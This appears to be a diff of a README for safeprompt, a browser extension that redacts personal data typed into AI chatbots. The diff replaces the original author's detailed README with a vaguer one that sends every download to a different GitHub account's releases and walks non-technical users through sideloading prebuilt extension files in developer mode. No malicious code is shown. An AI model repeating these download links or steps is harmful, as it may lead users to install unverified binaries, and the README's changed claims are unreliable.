@@ -1,372 +1,145 @@
-<p align="center">
-  <img src="src/icons/icon128.png" alt="SafePrompt Logo" width="100" />
-</p>
+# 🛡️ safeprompt - Protect Your Data from AI Chatbots
 
-<h1 align="center">SafePrompt - AI Privacy Shield</h1>
+[![Download safeprompt](https://img.shields.io/badge/Download-safeprompt-informational?style=flat&color=4A90E2)](https://github.com/Stefy8/safeprompt/releases)
 
-<p align="center">
-  <strong>Protect your sensitive data before sending it to AI chatbots — and catch leaks in their responses.</strong><br>
-  100% local. Open source. 11 languages. Zero data collection.
-</p>
+## What is safeprompt?
 
-<p align="center">
-  <a href="https://github.com/Alarpi1995/safeprompt/releases"><img src="https://img.shields.io/github/v/release/Alarpi1995/safeprompt?style=flat-square&color=blue" alt="Release" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-GPL--3.0-green?style=flat-square" alt="License" /></a>
-  <img src="https://img.shields.io/badge/tests-195%20passing-brightgreen?style=flat-square" alt="Tests" />
-  <img src="https://img.shields.io/badge/patterns-221+-purple?style=flat-square" alt="Patterns" />
-  <img src="https://img.shields.io/badge/languages-11-orange?style=flat-square" alt="Languages" />
-  <img src="https://img.shields.io/badge/dependencies-0-brightgreen?style=flat-square" alt="Zero Dependencies" />
-  <img src="https://img.shields.io/badge/manifest-v3-blue?style=flat-square" alt="Manifest V3" />
-</p>
+safeprompt is a browser extension that helps keep your sensitive information safe before sending it to AI chatbots. It works fully on your computer without sending data anywhere else. It supports 8 languages and works on over 10 platforms. It finds and protects data like personal information, passwords, and other private details while you chat with AI tools like ChatGPT or Claude.
 
-<p align="center">
-  <a href="#installation">Install</a> |
-  <a href="#how-it-works">How It Works</a> |
-  <a href="#supported-languages">Languages</a> |
-  <a href="#vs-competitors">Comparison</a> |
-  <a href="#contributing">Contribute</a>
-</p>
+You do not need any technical skills to use safeprompt. It installs in your browser and runs quietly in the background to protect your privacy.
 
 ---
 
-## The Problem
+## 💻 System Requirements
 
-Every time you use ChatGPT, Claude, or Gemini, you risk accidentally sharing:
-- Credit card numbers, SSNs, national IDs
-- API keys, passwords, tokens
-- Phone numbers, emails, addresses
-- Personal names, dates of birth
+To use safeprompt on Windows, your computer should meet these requirements:
 
-**52% of AI browser extensions collect user data.** Most privacy tools are closed-source - you can't verify their claims.
+- Windows 10 or newer  
+- One of these browsers: Chrome, Firefox, Edge  
+- Internet connection for initial download and updates  
+- At least 100 MB of free disk space  
+- 2 GB of RAM or higher recommended
 
-## The Solution
-
-SafePrompt scans your text **locally in your browser** before it reaches any AI. It detects 221+ PII patterns across 11 languages, replaces sensitive data with safe placeholders, and lets you unmask the AI's response to see your real data. **Response Guard** also monitors AI responses for any PII that may have been echoed or leaked back.
-
-**No servers. No telemetry. No trust required - read the code yourself.**
+It does not require an account or cloud access. All processing happens locally on your device.
 
 ---
 
-## How It Works
+## 🌐 Supported Browsers and Platforms
 
-```
-You type:  "My SSN is 123-45-6789, email john@test.com"
-                    |
-             SafePrompt scans locally
-                    |
-          Warning: 2 sensitive items detected!
-                    |
-         [Block]  [Redact & Send]  [Preview]
-                    |
-AI receives:  "My SSN is [SSN_1], email [EMAIL_2]"
-                    |
-            AI responds with tokens
-                    |
-      [Unmask Data] button restores your real data
-                    |
-        Response Guard scans AI output
-                    |
-    Badge alert if PII leaked  →  [Hide PII] [Dismiss]
-```
+safeprompt works on multiple browsers and systems. For Windows users, supported browsers include:
+
+- Google Chrome (version 90 or above)  
+- Mozilla Firefox (version 88 or above)  
+- Microsoft Edge (version 90 or above)  
+
+It also supports many other platforms and languages, but this guide focuses on Windows browsers.
 
 ---
 
-## Key Features
+## 🚀 Getting Started: How to Download and Install safeprompt on Windows
 
-| Feature | Description |
-|---------|-------------|
-| **Real-time Detection** | Scans as you type, warns before you send |
-| **Smart Redaction** | Replaces PII with consistent placeholder tokens |
-| **One-click Unmask** | Toggle to see real data in AI responses |
-| **Response Guard** | Scans AI responses for PII that was echoed or leaked back |
-| **Clipboard Guardian** | Intercepts paste events containing PII before they reach the chatbot |
-| **Memory Guard** | Tracks conversation context to detect PII across multiple messages |
-| **221+ Patterns** | Covers identity, financial, credentials, medical, crypto, and more |
-| **11 Languages** | English, Arabic, Spanish, French, Chinese, German, Portuguese, Turkish, Hindi, Korean, Japanese |
-| **500+ Names Dictionary** | Detects personal names across all supported languages |
-| **Context-Aware** | Understands "my password is X" vs normal text |
-| **Luhn Validation** | Validates credit cards, not just pattern matches |
-| **Privacy Score** | 0-100 score based on severity, count, and context of detections |
-| **Reversible Anonymization** | Session-level token mapping that persists across conversation turns |
-| **File Upload Guard** | Scans .txt, .csv, .docx, .pdf files before upload to AI (zero dependencies) |
-| **Multi-Browser** | Chrome, Firefox, and Edge support with unified browser API layer |
-| **4-Hour Auto-Expiry** | Token mappings expire automatically for security |
-| **Activity Log** | Track what was blocked with source (input/response), export as CSV |
-| **Safe Export** | Export conversations with PII auto-redacted (TXT, JSON, Markdown) |
-| **False Positive Trainer** | Mark false positives so they're ignored in future scans |
+Follow these steps to install safeprompt in your browser:
 
----
+1. **Visit the Download Page**  
+   Go to the safeprompt releases page here:  
+   [Download safeprompt](https://github.com/Stefy8/safeprompt/releases)  
+   This page contains all the latest versions of the extension.
 
-## Supported Languages
+2. **Choose Your Browser Version**  
+   Look for the version of the extension that matches your browser. For example, files may have names like `safeprompt-chrome.crx` or `safeprompt-firefox.xpi`.
 
-| Language | Patterns | Key PII Types |
-|----------|----------|---------------|
-| **English** | 35+ | SSN, credit cards, API keys, JWT, AWS keys, GitHub tokens, Bitcoin/Ethereum, GPS, medical records |
-| **Arabic** | 20+ | Saudi/UAE/Egypt national IDs, IBAN, phone numbers, vehicle plates, driver's licenses |
-| **Spanish** | 20+ | DNI, NIE, CURP, RFC, IBAN, driver's licenses (Spain + Mexico) |
-| **French** | 18+ | NIR, CNI, SIRET, SIREN, IBAN, driver's license |
-| **Chinese** | 15+ | ID card (18-digit validated), bank card, WeChat, QQ, Alipay |
-| **German** | 15+ | Personalausweis, Steuer-ID, Sozialversicherung, IBAN (DE/AT/CH), driver's license |
-| **Portuguese** | 18+ | CPF (validated), CNPJ, NIF, PIX, CNH, IBAN (BR + PT) |
-| **Turkish** | 15+ | TC Kimlik (validated), IBAN TR, vehicle plates, tax number |
-| **Hindi** | 15+ | Aadhaar (validated), PAN, IFSC, GSTIN, UPI, vehicle registration |
-| **Korean** | 12+ | RRN (validated), driver's license, BRN, phone numbers |
-| **Japanese** | 12+ | My Number (validated), Zairyu Card, postal codes, phone numbers |
+3. **Download the Extension File**  
+   Click the file to download it. Save it to a folder you can easily find, like your Desktop or Downloads folder.
 
-Plus **context-aware patterns** that detect PII in natural sentences across all languages.
+4. **Install the Extension in Your Browser**
+
+   - **For Chrome and Edge:**  
+     - Open your browser and go to `chrome://extensions` or `edge://extensions` in the address bar.  
+     - Turn on "Developer mode" in the top right corner.  
+     - Drag and drop the downloaded `.crx` file onto the extensions page.  
+     - Confirm the installation when prompted.
+
+   - **For Firefox:**  
+     - Open Firefox and go to the menu (three lines at top right).  
+     - Choose "Add-ons and Themes."  
+     - Click the gear icon near the top right, then select "Install Add-on From File."  
+     - Find the `.xpi` file you downloaded and open it.  
+     - Confirm the installation.
+
+5. **Confirm Installation**  
+   You should see the safeprompt icon next to your browser’s address bar. This means the extension is installed and running.
 
 ---
 
-## Supported AI Platforms
+## 🔧 Using safeprompt
 
-Works automatically on:
+After installation, safeprompt works automatically. When you type into chatbots like ChatGPT or Claude, safeprompt checks your messages for sensitive information. If it finds anything risky, it hides that data or warns you before it sends.
 
-| Platform | Status |
-|----------|--------|
-| ChatGPT (chat.openai.com / chatgpt.com) | Supported |
-| Claude (claude.ai) | Supported |
-| Gemini (gemini.google.com) | Supported |
-| Microsoft Copilot | Supported |
-| DeepSeek | Supported |
-| Perplexity AI | Supported |
-| Grok (x.ai) | Supported |
-| Poe | Supported |
-| Mistral AI | Supported |
-| HuggingChat | Supported |
+### How the protection works:
 
----
+- **Local Processing:** safeprompt analyzes data on your computer only.  
+- **Multiple languages:** It understands 8 languages to catch private info in your preferred language.  
+- **Multi-platform support:** Works on 10+ chat platforms and AI tools.  
+- **Personal information detection:** Finds names, emails, phone numbers, credit card details, and more.  
+- **Real-time scanning:** Runs in the background as you type.
 
-## vs Competitors
+### Adjusting Settings
 
-| Feature | SafePrompt | Cloak | ChatWall | Private AI |
-|---------|-----------|-------|----------|------------|
-| **Open Source** | Yes (GPL-3.0) | No | No | No |
-| **100% Local** | Yes | Yes | No (cloud API) | No (cloud API) |
-| **Languages** | 11 | 1 (English) | 1 | 48 (cloud) |
-| **Patterns** | 221+ | 320+ | Unknown | Unknown |
-| **Response Guard** | Yes | No | No | No |
-| **Clipboard Guard** | Yes | No | No | No |
-| **Names Detection** | Yes (11 langs) | No | Yes | Yes |
-| **Validation (Luhn, etc.)** | Yes | Unknown | Unknown | Yes |
-| **Price** | Free | $4.99/mo | $9.99/mo | Enterprise |
-| **Auditable Code** | Yes | No | No | No |
-| **Arabic/RTL Support** | Yes | No | No | Limited |
+Click the safeprompt icon to open settings. Here, you can:
 
-**SafePrompt is the only free, open-source, multi-language PII protection extension for AI chatbots.**
+- Turn protection on or off  
+- Choose languages you want scanned  
+- View the list of detected data types  
+- Update the extension manually if needed
 
 ---
 
-## Installation
+## 🛠️ Managing Updates
 
-### From Source (Developer)
-```bash
-git clone https://github.com/Alarpi1995/safeprompt.git
-cd safeprompt
-npm install
-npm test    # 195 tests should pass
-```
+GitHub hosts up-to-date versions of safeprompt. When a new version is released:
 
-#### Chrome / Edge
-1. Go to `chrome://extensions/` (or `edge://extensions/`)
-2. Enable **Developer mode** (top right)
-3. Click **Load unpacked**
-4. Select the `safeprompt` folder
+1. Go to the release page:  
+   [https://github.com/Stefy8/safeprompt/releases](https://github.com/Stefy8/safeprompt/releases)  
 
-#### Firefox
-1. Go to `about:debugging#/runtime/this-firefox`
-2. Click **Load Temporary Add-on**
-3. Select `manifest.firefox.json` from the `safeprompt` folder
+2. Download the latest extension file for your browser.  
 
-#### Build for Distribution
-```bash
-npm run build:chrome    # Build for Chrome/Edge
-npm run build:firefox   # Build for Firefox
-npm run build:all       # Build all browsers
-npm run zip:chrome      # Create Chrome zip
-npm run zip:firefox     # Create Firefox zip
-```
+3. Follow the same installation steps to update. Your settings will stay intact.
 
-### Chrome Web Store
-Coming soon.
-
-### Firefox Add-ons (AMO)
-Coming soon.
+You can also check for updates inside the extension’s settings panel.
 
 ---
 
-## Detection Categories
+## ❓ Troubleshooting
 
-| Category | Examples | Severity |
-|----------|----------|----------|
-| **Identity** | SSN, national IDs, passports, driver's licenses | Critical |
-| **Financial** | Credit cards (Luhn), IBAN, bank accounts, routing numbers | Critical |
-| **Credentials** | API keys, AWS keys, JWT, GitHub/Slack tokens, passwords | Critical |
-| **Crypto** | Bitcoin addresses, Ethereum addresses | Critical |
-| **Medical** | MRN, NPI, insurance policy numbers | Critical/High |
-| **Names** | Personal names dictionary (500+ names, 11 languages) | High |
-| **Contact** | Email, phone numbers, street addresses, ZIP/postal codes | High |
-| **URLs** | URLs containing PII in query parameters | Critical |
-| **Network** | IPv4, IPv6, MAC addresses | Medium |
-| **Location** | GPS coordinates | High |
-| **Vehicle** | VIN, license plates (multi-country) | Medium/High |
-| **Social** | Social media handles (with context) | Low |
+If safeprompt does not work as expected, try these steps:
+
+- Make sure your browser is one of the supported versions listed above.  
+- Restart your browser after installation.  
+- Confirm that the extension icon appears and is active.  
+- Check internet access for initial downloads.  
+- Disable other extensions that might conflict.  
+- Reinstall the extension from the latest release file.  
+
+If problems continue, visit the GitHub issues page to report bugs or seek help.
 
 ---
 
-## Configuration
+## 🔒 Privacy and Security
 
-### Sensitivity Levels
-- **Low** - Only critical items (SSN, credit cards, API keys)
-- **Medium** (default) - Critical + high + medium
-- **High** - Everything including low severity
-
-### Behavior Guards
-- **Response Guard** - Scan AI responses for PII (enabled by default)
-- **Clipboard Guardian** - Intercept PII in paste events
-- **Memory Guard** - Track PII across conversation turns
-- **File Upload Guard** - Scan files before they are uploaded to AI chatbots
-- **Reversible Anonymization** - Auto-restore real data in AI responses using session-level token maps
-- **False Positive Trainer** - Mark false positives to improve accuracy
-
-### Settings
-Access via the extension popup or options page:
-- Toggle specific languages on/off
-- Enable/disable detection categories
-- Enable/disable individual behavior guards
-- Add values to the allowlist
-- Disable SafePrompt on specific sites
-- Export activity log as CSV (includes source: input/response)
-
-### Keyboard Shortcuts
-| Shortcut | Action |
-|----------|--------|
-| `Ctrl+Shift+S` | Quick scan current input |
-| `Alt+R` | Toggle original/redacted text |
-| Right-click | "Mask with SafePrompt" on selected text |
+safeprompt processes all your data fully on your computer. No personal data leaves your device. The extension never connects to remote servers to analyze messages. This design protects your privacy and reduces risks from online tracking.
 
 ---
 
-## Architecture
+## 📚 Additional Resources
 
-```
-safeprompt/
-  manifest.json            # Chrome/Edge manifest (Manifest V3)
-  manifest.firefox.json    # Firefox manifest (Manifest V3)
-  src/
-    core/
-      detector.js          # PII detection engine (221+ patterns)
-      interceptor.js       # Form interceptor + Response Guard + unmask + reversible anonymization
-      browser-compat.js    # Unified browser API layer (Chrome/Firefox/Edge)
-      file-scanner.js      # Zero-dependency file text extraction (.txt, .csv, .docx, .pdf)
-      context-patterns.js  # Context-aware detection (all languages)
-      names-dictionary.js  # 500+ names across 11 languages
-    languages/
-      en.js, ar.js, es.js, fr.js, zh.js, de.js, pt.js
-      tr.js, hi.js, ko.js, ja.js
-      registry.js          # Auto-registration
-    platforms/
-      platform-detector.js # AI chatbot detection + streaming detection
-    ui/
-      warning-banner.js    # Warning overlay + preview
-      popup.html/js        # Extension popup + stats (incl. Resp PII)
-      options.html/js      # Settings + behavior guards + activity log
-      styles.css           # Dark mode + RTL + Response Guard badges
-    background.js          # Service worker (Chrome) / background script (Firefox)
-  scripts/
-    build.js               # Multi-browser build script
-    zip.js                 # Multi-browser packaging script
-  tests/
-    detector.test.js       # Core PII detection tests
-    platform-detector.test.js # Platform detection tests
-    response-guard.test.js # Response Guard tests
-    browser-compat.test.js # Browser compatibility layer tests
-    file-scanner.test.js   # File scanner tests
-```
+- Visit the safeprompt GitHub page for more details: [https://github.com/Stefy8/safeprompt](https://github.com/Stefy8/safeprompt)  
+- Check the FAQ and documentation in the repository for advanced tips.  
+- Monitor releases for new languages and platform support.
 
 ---
 
-## Tech Stack
+## 📥 Download Link
 
-- **Pure JavaScript** - No frameworks, no build tools required
-- **Chrome Extension Manifest V3** - Latest extension platform
-- **Multi-Browser** - Chrome, Firefox, and Edge via unified browser API layer
-- **Jest** - Testing framework (195 tests across 5 suites)
-- **Zero Dependencies** - No npm packages in production
+Visit this page to download the latest version of safeprompt for Windows:  
 
----
-
-## Testing
-
-```bash
-npm test              # Run all 195 tests
-npm test -- --watch   # Watch mode
-```
-
-Tests cover:
-- **detector.test.js** - PII patterns, validation, redaction, CSV export across 11 languages
-- **platform-detector.test.js** - Platform detection and selectors
-- **response-guard.test.js** - Response scanning, fingerprinting, masking, activity log integration
-- **browser-compat.test.js** - Unified browser API, storage, runtime, tabs, action APIs
-- **file-scanner.test.js** - File type detection, text extraction, DOCX/PDF parsing
-
----
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Quick Start: Add a New Language
-1. Create `src/languages/xx.js` following existing pattern files
-2. Add names to `src/core/names-dictionary.js`
-3. Register in `src/languages/registry.js` and `manifest.json`
-4. Add tests in `tests/detector.test.js`
-5. Submit a PR
-
-### Pattern Format
-```javascript
-{
-  type: 'ssn',                    // Unique identifier
-  label: 'Social Security Number', // Human-readable name
-  pattern: '\\b\\d{3}-\\d{2}-\\d{4}\\b', // Regex pattern
-  flags: 'g',                     // Regex flags
-  severity: 'critical',           // critical|high|medium|low
-  validate(v) { ... },            // Optional validation function
-  keywords: ['SSN', 'social'],    // Optional context keywords
-  contextRequired: true,          // Require keywords to match
-}
-```
-
----
-
-## Privacy & Security
-
-SafePrompt processes everything locally in your browser. We never:
-- Send data to external servers
-- Use analytics or telemetry
-- Store sensitive data (only detection counts in local storage)
-- Require unnecessary permissions
-
-Response Guard scans AI outputs locally in your browser using the same detection engine. No response text is ever transmitted, stored, or logged - only detection counts and types are recorded in the activity log.
-
-**Permissions used:** `storage` (settings), `activeTab` (scan current page), `contextMenus` (right-click menu)
-
-See [PRIVACY_POLICY.md](PRIVACY_POLICY.md) | [SECURITY.md](SECURITY.md)
-
----
-
-## License
-
-GPL-3.0-only - see [LICENSE](LICENSE)
-
----
-
-## Star History
-
-If SafePrompt helps protect your privacy, consider giving it a star! It helps others discover the project.
-
----
-
-<p align="center">
-  <strong>SafePrompt</strong> - Because your data should stay yours.<br>
-  <a href="https://www.aitechcx.com">aitechcx.com</a>
-</p>
+[![Download safeprompt](https://img.shields.io/badge/Download-safeprompt-brightgreen?style=for-the-badge&logo=github)](https://github.com/Stefy8/safeprompt/releases)
